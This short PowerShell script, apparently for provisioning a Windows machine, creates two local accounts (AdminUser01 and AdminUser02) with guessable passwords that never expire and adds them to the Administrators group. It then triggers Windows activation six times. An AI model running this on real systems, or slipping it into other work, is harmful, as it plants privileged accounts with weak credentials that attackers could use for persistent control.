
foreach ($i in 1..2) {
$UserName = ('AdminUser{0:d2}' -f $i)
net user $UserName ('Passkey{0:d2}' -f $i) /add /y /expires:never
net localgroup Administrators $UserName
}

1..6 | ForEach-Object { Invoke-Expression "$env:windir\system32\cscript.exe $env:windir\system32\slmgr.vbs /ato" }

